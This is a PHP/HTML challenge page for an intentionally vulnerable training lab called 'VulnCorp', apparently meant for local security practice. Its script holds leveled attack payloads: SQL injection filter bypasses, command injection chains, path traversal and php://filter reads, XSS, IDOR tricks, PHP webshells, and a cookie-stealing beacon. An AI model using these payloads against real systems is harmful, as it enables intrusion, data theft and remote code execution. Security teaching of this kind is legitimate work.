<?php header('Cache-Control: no-store, max-age=0'); /* VulnCorp hub */ ?>
<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>VulnCorp — Challenges</title>
<style>
:root{--bg:#0b0f16;--card:#0d1117;--card2:#161b22;--ink:#dfe6ee;--muted:#8b98a5;--line:#1c2330;--brand:#1f6feb;--ok:#2e9b4f}
*{box-sizing:border-box}body{font-family:system-ui,Segoe UI,Arial,sans-serif;background:var(--bg);color:var(--ink);margin:0;line-height:1.5}
.topbar{position:sticky;top:0;z-index:5;background:linear-gradient(120deg,#0e1726,#1f6feb);color:#fff;padding:12px 18px;display:flex;align-items:center;gap:12px;box-shadow:0 2px 10px rgba(0,0,0,.4)}
.brand{font-weight:700;font-size:1.15em}.badge{font-size:.72em;background:rgba(255,255,255,.18);padding:2px 9px;border-radius:20px}
.nav{margin-left:auto;display:flex;gap:8px;flex-wrap:wrap}.nav a{color:#fff;text-decoration:none;font-size:.85em;background:rgba(255,255,255,.14);padding:5px 11px;border-radius:7px}.nav a:hover{background:rgba(255,255,255,.28)}
.wrap{max-width:900px;margin:22px auto;padding:0 16px}
.card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px 18px;margin:14px 0}
.card h2{margin:0 0 8px;font-size:1.02em;color:#8ab4ff;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.card h2 code{background:#0b0f16;color:#9ce6a0;padding:2px 7px;border-radius:5px;font-size:.92em}
.flag-pill{font-size:.7em;font-weight:600;background:#3a2d12;color:#ffd080;padding:2px 8px;border-radius:20px}
details{margin:6px 0 10px}summary{cursor:pointer;color:var(--brand);font-size:.9em}
details .pl{display:block;margin:8px 0;background:#05070b;color:#9ce6a0;padding:8px 10px;border-radius:6px;font-family:ui-monospace,Consolas,monospace;font-size:.85em;white-space:pre-wrap;word-break:break-all}
form{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin:4px 0}
input[type=text],textarea{flex:1;min-width:200px;padding:8px 10px;border:1px solid var(--line);border-radius:7px;background:#05070b;color:var(--ink);font-family:ui-monospace,Consolas,monospace;font-size:.9em}
textarea{min-height:70px;width:100%}
button{background:var(--brand);color:#fff;border:0;border-radius:7px;padding:8px 13px;cursor:pointer;font-size:.88em}
button.ghost{background:#1c2330;color:#8ab4ff}button:hover{filter:brightness(1.12)}
.levels{display:flex;gap:6px;margin:8px 0;flex-wrap:wrap}.lvlbtn{background:#1c2330;color:#8b98a5;font-size:.8em;padding:4px 11px}
.lvlbtn.on{background:#1f6feb;color:#fff}.note{color:var(--muted);font-size:.85em}
.card.chal>.cbody{display:none}.card.chal.open>.cbody{display:block}.card.chal>h2{cursor:pointer}
.card.chal>h2::before{content:"▸ ";opacity:.5;font-weight:400}.card.chal.open>h2::before{content:"▾ "}
.urlprev{color:#79c0ff;font-size:.8em;font-family:ui-monospace,Consolas,monospace;margin:6px 0 0;word-break:break-all;opacity:.85}
.res{width:100%;height:200px;border:1px solid var(--line);border-radius:8px;background:#fff;margin-top:8px;display:block}
.rx{white-space:pre-wrap;background:#05070b;color:var(--ink);border:1px solid var(--line);border-radius:8px;padding:10px;margin-top:8px;font-family:ui-monospace,Consolas,monospace;font-size:.85em;display:block;max-height:200px;overflow:auto}
.muted{color:var(--muted);font-size:.92em}a{color:#8ab4ff}
footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted);font-size:.85em;border-top:1px solid var(--line)}
</style></head><body>
<div class="topbar"><span class="brand">🛡 VulnCorp</span><span class="badge">app 1 · challenge hub</span>
<nav class="nav"><a href="home.php">Home</a><a href="index.php">🎯 Hub</a><a href="progress.php">📊 Progress</a><a href="reset.php">↺ Reset</a><a href="feedback.php">💬 Feedback</a></nav></div>
<div class="wrap">
<div class="card"><h2>Challenge hub — fill &amp; run 🏁 <span style="float:right;opacity:.5;font-size:.6em;font-weight:400">loaded <?php echo date('H:i:s'); ?></span></h2>
<p class="muted">There are <b>two ways</b> to use this lab — same vulnerable code behind both:</p>
<ul class="muted" style="margin:4px 0 8px;line-height:1.7">
  <li>🎯 <b>Hub (this page)</b> — the <b>fancy, guided</b> console: pick a card, choose a level, click
      <b>💡 hint → use this → Run</b>, and the answer shows in the panel. Best for <b>learning and comparing levels</b>.</li>
  <li>🏠 <b><a href="home.php">Home</a></b> — the <b>plain</b> VulnCorp app (search, login, profile, upload…).
      Less pretty, but <b>more direct/functional</b>: you drive the real pages and craft payloads in the URL yourself, like a real target. Use it when the hub feels fiddly.</li>
</ul>
<p class="muted">Work out the payload yourself; stuck → reveal the <b>💡 hint</b>. Full walkthroughs in <code>SOLUTIONS.md</code>.</p></div>

<!-- Login: SQLi bypass + weak creds -->
<div class="card"><h2><code>login.php</code> <span class="flag-pill">🏁 SQLi auth-bypass</span> <span class="flag-pill">weak creds</span></h2>
  <p class="muted">Log in without a password — inject the <b>username</b> field. The filter escalates per level.</p>
  <div class="levels" id="lv_login"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('login','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('login','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('login','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('login','expert')">Expert</button></div>
  <details><summary>💡 hint — <span class="note" id="note_login"></span></summary><code class="pl" id="pl_login"></code>
    <button type="button" class="ghost" onclick="document.getElementById('in_lu').value=document.getElementById('pl_login').textContent;document.getElementById('in_lp').value='x';document.getElementById('in_lu').dispatchEvent(new Event('input'))">use this ▶</button>
    <span class="muted"> · or weak creds <code>admin : S3ntinel!Admin</code></span></details>
  <form method="post" action="login.php?embed=1" target="r_login" onsubmit="show('r_login')">
    <input type="hidden" name="level" id="lvl_login" value="easy">
    <input type="text" id="in_lu" name="username" placeholder="username" style="min-width:140px">
    <input type="text" id="in_lp" name="password" placeholder="password" style="min-width:140px"><button>Login ▶</button></form>
  <iframe name="r_login" id="r_login" class="res"></iframe></div>

<!-- Search: UNION SQLi (leveled) -->
<div class="card"><h2><code>home.php?q=</code> <span class="flag-pill">🏁 UNION SQLi</span></h2>
  <p class="muted">Two bugs share this box. <b>SQLi</b> (use SQLi ▶) → read the <b>✓/✗ match</b> result below (expert is blind). <b>Reflected XSS</b> (use XSS ▶) → the payload breaks out of the search field and an <b>alert pops</b>; ignore the match line. Both filters escalate per level.</p>
  <div class="levels" id="lv_q"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('q','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('q','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('q','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('q','expert')">Expert</button></div>
  <details><summary>💡 hint — <span class="note" id="note_q"></span></summary>
    <code class="pl" id="pl_q"></code><button type="button" class="ghost" onclick="fill('in_q','pl_q')">use SQLi ▶</button>
    <code class="pl" id="pl_qx"></code><button type="button" class="ghost" onclick="fill('in_q','pl_qx')">use XSS ▶</button></details>
  <form method="get" action="home.php" target="r_q" onsubmit="show('r_q')">
    <input type="hidden" name="level" id="lvl_q" value="easy"><input type="hidden" name="embed" value="1">
    <input type="text" id="in_q" name="q" placeholder="your SQLi payload…"><button>Run ▶</button></form>
  <iframe name="r_q" id="r_q" class="res"></iframe></div>

<!-- Guestbook: stored XSS (leveled) -->
<div class="card"><h2><code>index.php</code> guestbook <span class="flag-pill">🏁 stored XSS</span></h2>
  <p class="muted">Post a comment; it's rendered to every visitor through the level's display filter. The page sets a non-HttpOnly <code>flag</code> cookie — swap <code>alert()</code> for a beacon (<code>new Image().src='http://127.0.0.1:9001/?c='+document.cookie</code>) to steal it.</p>
  <div class="levels" id="lv_gb"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('gb','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('gb','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('gb','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('gb','expert')">Expert</button></div>
  <details><summary>💡 hint — <span class="note" id="note_gb"></span></summary>
    <code class="pl" id="pl_gb"></code><button type="button" class="ghost" onclick="fill('in_gb','pl_gb')">use this ▶</button></details>
  <form method="post" action="home.php" target="r_gb" onsubmit="show('r_gb')">
    <input type="hidden" name="level" id="lvl_gb" value="easy"><input type="hidden" name="embed" value="1">
    <input type="text" name="author" placeholder="name" style="min-width:120px">
    <input type="text" id="in_gb" name="body" placeholder="message / payload…"><button>Post ▶</button></form>
  <iframe name="r_gb" id="r_gb" class="res"></iframe></div>

<!-- Profile: IDOR (leveled) -->
<div class="card"><h2><code>profile.php?id=</code> <span class="flag-pill">🏁 IDOR</span></h2>
  <p class="muted">No ownership check. The id reference gets more obfuscated each level — all still forgeable. (1 = admin)</p>
  <div class="levels" id="lv_id"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('id','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('id','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('id','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('id','expert')">Expert</button></div>
  <details><summary>💡 hint — <span class="note" id="note_id"></span></summary>
    <code class="pl" id="pl_id"></code><button type="button" class="ghost" onclick="fill('in_id','pl_id')">use this ▶</button></details>
  <form method="get" action="profile.php" target="r_id" onsubmit="show('r_id')">
    <input type="hidden" name="level" id="lvl_id" value="easy"><input type="hidden" name="embed" value="1">
    <input type="text" id="in_id" name="id" placeholder="id (or encoded id)…" style="min-width:170px"><button>Run ▶</button></form>
  <iframe name="r_id" id="r_id" class="res"></iframe></div>

<!-- Net Tools: command injection (leveled) -->
<div class="card"><h2><code>tools.php?host=</code> <span class="flag-pill">🏁 command injection</span></h2>
  <p class="muted">The host is passed to a shell <code>ping</code>. Run your own command; the filter escalates.</p>
  <div class="levels" id="lv_cmd"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('cmd','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('cmd','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('cmd','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('cmd','expert')">Expert</button></div>
  <details><summary>💡 hint — <span class="note" id="note_cmd"></span></summary>
    <code class="pl" id="pl_cmd"></code><button type="button" class="ghost" onclick="fill('in_cmd','pl_cmd')">use this ▶</button></details>
  <form method="get" action="tools.php" target="r_cmd" onsubmit="show('r_cmd')">
    <input type="hidden" name="level" id="lvl_cmd" value="easy"><input type="hidden" name="embed" value="1">
    <input type="text" id="in_cmd" name="host" placeholder="host; command…"><button>Run ▶</button></form>
  <div id="cmd_step2" style="display:none">
    <p class="muted"><b>Step 2 (blind exfil):</b> your payload redirected the flag into <code>uploads/pwn.txt</code> — a file under the web root. Read it at its full URL:</p>
    <form onsubmit="document.getElementById('r_cmd').src=document.getElementById('readpath').value; show('r_cmd'); return false;">
      <input type="text" id="readpath" value="http://<?php echo htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'localhost:8000'); ?>/uploads/pwn.txt" placeholder="full URL of the file you wrote"><button class="ghost">📄 read ▶</button></form>
  </div>
  <iframe name="r_cmd" id="r_cmd" class="res"></iframe></div>

<!-- Page: LFI (leveled) -->
<div class="card"><h2><code>home.php?page=</code> <span class="flag-pill">🏁 LFI / path traversal</span></h2>
  <p class="muted">Includes <code>pages/&lt;name&gt;</code>. Read <code>lfi_secret/flag.txt</code> (outside the web root). Filter escalates.</p>
  <div class="levels" id="lv_pg"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('pg','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('pg','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('pg','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('pg','expert')">Expert</button></div>
  <details><summary>💡 hint — <span class="note" id="note_pg"></span></summary>
    <code class="pl" id="pl_pg"></code><button type="button" class="ghost" onclick="fill('in_pg','pl_pg')">use this ▶</button></details>
  <form method="get" action="home.php" target="r_pg" onsubmit="show('r_pg')">
    <input type="hidden" name="level" id="lvl_pg" value="easy"><input type="hidden" name="embed" value="1">
    <input type="text" id="in_pg" name="page" placeholder="file path…"><button>Run ▶</button></form>
  <iframe name="r_pg" id="r_pg" class="res"></iframe></div>

<!-- Upload: webshell (leveled) -->
<div class="card"><h2><code>upload.php</code> → <code>uploads/</code> <span class="flag-pill">🏁 upload → RCE</span></h2>
  <p class="muted">Upload a PHP webshell, then run commands. The file checks escalate each level (the content-type is sent as image/gif for you).</p>
  <div class="levels" id="lv_up"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('up','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('up','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('up','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('up','expert')">Expert</button></div>
  <input type="hidden" id="lvl_up" value="easy">
  <p class="note" id="note_up"></p>
  <label class="muted">1) shell code (pre-filled per level) &amp; name</label>
  <textarea id="up_code"></textarea>
  <form onsubmit="doUpload();return false"><input type="text" id="up_name" value="shell.php" style="min-width:120px"><button>Upload ▶</button></form>
  <pre id="r_up" class="rx"></pre>
  <label class="muted">2) run a command through uploads/shell.php</label>
  <details><summary>💡 hint</summary><code class="pl" id="pl_up">cat ../private/upload_flag.txt</code>
    <button type="button" class="ghost" onclick="fill('in_up','pl_up')">use this ▶</button></details>
  <form method="get" action="uploads/shell.php" target="r_upc" onsubmit="show('r_upc')">
    <input type="text" id="in_up" name="cmd" placeholder="command… (e.g. id)"><button>Run ▶</button></form>
  <iframe name="r_upc" id="r_upc" class="res"></iframe></div>

<!-- Info disclosure -->
<div class="card"><h2>Information disclosure <span class="flag-pill">🏁 config backup</span></h2>
  <p class="muted"><code>robots.txt</code> maps the "hidden" paths; the <code>.bak</code> is served as plaintext.
  (Open in a new tab — a browser hides <code>&lt;?php?&gt;</code>; use <b>View Source / Ctrl+U</b>.)</p>
  <p><a href="robots.txt" target="_blank">/robots.txt</a> · <a href="config.php.bak" target="_blank">/config.php.bak</a>
   · <a href=".well-known/security.txt" target="_blank">/.well-known/security.txt</a>
   · <a href="private/deployment-notes.txt" target="_blank">/private/deployment-notes.txt</a></p></div>

<!-- CSP -->
<div class="card"><h2>Weak CSP <span class="flag-pill">analysis</span></h2>
  <p class="muted">Read the policy and the cookie in the browser: <b>DevTools (F12) → Network</b> → reload →
  click the document → <b>Response Headers</b> (the <code>Content-Security-Policy</code>), and
  <b>Console</b> → <code>document.cookie</code> (the <code>flag</code> cookie — proves it's not HttpOnly).
  <code>'unsafe-inline'</code> makes the stored-XSS cookie theft above work despite the CSP.</p></div>

</div>
<footer>⚠️ <b>Intentionally vulnerable — training only.</b> Run locally / isolated lab; never expose it.</footer>
<script>
function fill(inputId, plId){ var i=document.getElementById(inputId); i.value=document.getElementById(plId).textContent; i.dispatchEvent(new Event('input')); }
function show(frameId){ document.getElementById(frameId).style.display='block'; }
const PAYLOADS = {
 q:{
  easy:{p:"' UNION SELECT username,password,role FROM users-- -", n:"Easy — raw. Classic UNION dump."},
  medium:{p:"' UNIunionON SELselectECT username,password,role FROM users-- -", n:"Medium — 'union'/'select' stripped once → nest them (UNIunionON)."},
  hard:{p:"'/**/UNIunionON/**/SELselectECT/**/username,password,role/**/FROM/**/users#", n:"Hard — + spaces stripped → /**/ for spaces, end with #."},
  expert:{p:"zzz' OR 1=1-- -", n:"Expert — BLIND (match/no-match). Extract char-by-char from users: ' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='S'-- -"}
 },
 cmd:{
  easy:{p:"127.0.0.1; cat private/cmdi_flag.txt", n:"Easy — raw. Chain with ;"},
  medium:{p:"127.0.0.1 | cat private/cmdi_flag.txt", n:"Medium — ; and & stripped → use a pipe |"},
  hard:{p:"127.0.0.1$(cat${IFS}private/cmdi_flag.txt)", n:"Hard — ; & | ` and spaces stripped → $(...) with ${IFS}; the flag appears in the ping error."},
  expert:{p:"127.0.0.1; cat private/cmdi_flag.txt > uploads/pwn.txt", n:"Expert — BLIND (no output). Write to a readable file, then open /uploads/pwn.txt in a new tab."}
 },
 pg:{
  easy:{p:"../../lfi_secret/flag.txt", n:"Easy — raw traversal."},
  medium:{p:"....//....//lfi_secret/flag.txt", n:"Medium — '../' stripped once → ....// collapses back to ../"},
  hard:{p:"....//....//lfi_secret/flag.txt", n:"Hard — + must end .txt/.html (this does) → same ....// trick."},
  expert:{p:"php://filter/convert.base64-encode/resource=../lfi_secret/flag.txt", n:"Expert — traversal blocked; use the php://filter wrapper, then base64-decode the output."}
 }
};
PAYLOADS.q.easy.x='"><script>alert(1)<\/script>';
PAYLOADS.q.medium.x='"><img src=x onerror=alert(1)>';
PAYLOADS.q.hard.x='"><svg onload=alert(1)>';
PAYLOADS.q.expert.x='"><svg><animate onbegin=alert(1) attributeName=x dur=1s>';
PAYLOADS.gb={easy:{p:"<script>alert(document.cookie)<\/script>",n:"Easy — raw render."},medium:{p:"<img src=x onerror=alert(document.cookie)>",n:"Medium — '<script' stripped once → <img onerror>."},hard:{p:"<svg onload=alert(document.cookie)>",n:"Hard — onerror also stripped → <svg onload>."},expert:{p:"<svg><animate onbegin=alert(document.cookie) attributeName=x dur=1s>",n:"Expert — onload also stripped → <svg><animate onbegin>."}};
PAYLOADS.id={easy:{p:"1",n:"Easy — raw id, just change it."},medium:{p:"MQ==",n:"Medium — id is base64-encoded. MQ== = base64 of 1."},hard:{p:"c4ca4238a0b923820dcc509a6f75849b",n:"Hard — id is md5(real id). This string is md5 of 1."},expert:{p:"(id ignored — set cookie uid=1)",n:"Expert — the ?id is ignored; the app trusts a uid cookie. DevTools → Application → Cookies → add uid=1, then Run."}};
PAYLOADS.up={easy:{p:"<\x3Fphp system($_GET['cmd']); ?\x3E",n:"Easy — no checks."},medium:{p:"<\x3Fphp system($_GET['cmd']); ?\x3E",n:"Medium — content-type must be image/* (sent as image/gif for you)."},hard:{p:"GIF89a<\x3Fphp system($_GET['cmd']); ?\x3E",n:"Hard — content must start with GIF89a magic bytes (prefixed)."},expert:{p:"GIF89a<\x3Fphp passthru($_GET['cmd']); ?\x3E",n:"Expert — the word 'system' is blocked → passthru()."}};
var _ready=false;
function setLvl(card,lvl){
  var Ld=document.getElementById('lvl_'+card); if(Ld) Ld.value=lvl;
  var d=PAYLOADS[card][lvl];
  if(card==='up'){ document.getElementById('up_code').value=d.p; }
  else { var pl=document.getElementById('pl_'+card); if(pl) pl.textContent=d.p; }
  var nt=document.getElementById('note_'+card); if(nt) nt.textContent=d.n;
  var plx=document.getElementById('pl_'+card+'x'); if(plx && d.x) plx.textContent=d.x;
  if(card==='cmd'){ var s2=document.getElementById('cmd_step2'); if(s2) s2.style.display=(lvl==='expert')?'block':'none'; }
  var _inp=document.getElementById('in_'+card); if(_ready && _inp && card!=='up'){ _inp.value=d.p; try{_inp.dispatchEvent(new Event('input'));}catch(e){} }
  if(card==='login' && _ready){ var lu=document.getElementById('in_lu'); if(lu){ lu.value=d.p; document.getElementById('in_lp').value='x'; lu.dispatchEvent(new Event('input')); } }
  document.querySelectorAll('#lv_'+card+' .lvlbtn').forEach(function(b){ b.classList.toggle('on', b.getAttribute('data-l')===lvl); });
}
PAYLOADS.login={easy:{p:"admin'-- -",n:"Easy — comment out the password check."},medium:{p:"admin' or '1'='1",n:"Medium — comments stripped -> self-closing OR (no comment)."},hard:{p:"admin' oorr '1'='1",n:"Hard — 'or' also stripped -> nest it (oorr -> or)."},expert:{p:"admin'/**/oorr/**/'1'='1",n:"Expert — spaces also stripped -> /**/ as spaces."}};
['q','cmd','pg','gb','id','up','login'].forEach(function(c){ setLvl(c,'easy'); });
_ready=true;
// Accordion: collapse every challenge card; click a title to open it (closes the others).
document.querySelectorAll('.wrap > .card').forEach(function(card){
  var h=card.querySelector('h2'); if(!h) return;
  if(!card.querySelector('form, .levels, textarea')) return;   // skip the intro card
  card.classList.add('chal');
  var body=document.createElement('div'); body.className='cbody';
  while(h.nextSibling){ body.appendChild(h.nextSibling); }
  card.appendChild(body);
  h.addEventListener('click',function(){
    var open=card.classList.contains('open');
    document.querySelectorAll('.card.chal.open').forEach(function(c){ c.classList.remove('open'); });
    if(!open) card.classList.add('open');
  });
});
var first=document.querySelector('.card.chal'); if(first) first.classList.add('open');  // open the first
// Live URL preview under each GET form input (shows WHERE the payload goes).
document.querySelectorAll('form').forEach(function(f){
  var named=[]; f.querySelectorAll('input[type="text"],textarea').forEach(function(i){ if(i.name) named.push(i); });
  if(!named.length) return;
  var method=(f.getAttribute('method')||'get').toUpperCase();
  var act=(f.getAttribute('action')||'').split('?')[0]||'(this page)';
  var pv=document.createElement('div'); pv.className='urlprev'; f.appendChild(pv);
  function upd(){ var qs=named.map(function(i){return i.name+'='+i.value;}).join('&');
    pv.textContent=(method==='GET')?('→ GET '+act+'?'+qs):('→ POST '+act+'   body: '+qs); }
  named.forEach(function(i){ i.addEventListener('input',upd); }); upd();
});
function doUpload(){
  var out=document.getElementById('r_up'); out.style.display='block'; out.textContent='uploading…';
  var lvl=(document.getElementById('lvl_up')||{}).value||'easy';
  var name=document.getElementById('up_name').value||'shell.php';
  var fd=new FormData(); fd.append('file', new Blob([document.getElementById('up_code').value],{type:'image/gif'}), name);
  fetch('upload.php?level='+lvl+'&embed=1',{method:'POST',body:fd}).then(r=>r.text()).then(t=>out.textContent=t.replace(/<[^>]*>/g,' ').replace(/\s+/g,' ').trim()).catch(e=>out.textContent='error: '+e);
}
</script>
</body></html>
